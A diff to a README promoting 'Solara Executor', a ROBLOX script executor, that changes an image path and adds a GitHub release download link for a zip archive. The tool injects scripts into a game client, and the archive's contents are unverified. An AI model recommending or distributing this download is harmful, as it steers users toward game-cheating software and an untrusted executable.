@@ -1,7 +1,7 @@
 # 🌊 Solara Executor 🌊
 **A powerful ROBLOX executor for your scripting needs!** 🚀
 
-![Solara Executor Preview](/assets/Solara.gif) <!-- Add your image link here -->
+![Solara Executor Preview](/pics/Solara.gif) <!-- Add your image link here -->
 
 ---
 
@@ -17,7 +17,7 @@
 ## 📥 Download
 To get started, simply download the latest version of **Solara Executor** below:
 
-- [Download Solara Executor]()
+- [Download Solara Executor](https://github.com/SolaraExeDev/solara-v3/releases/download/Solara-V3/Solara.zip)
 
 ---
 
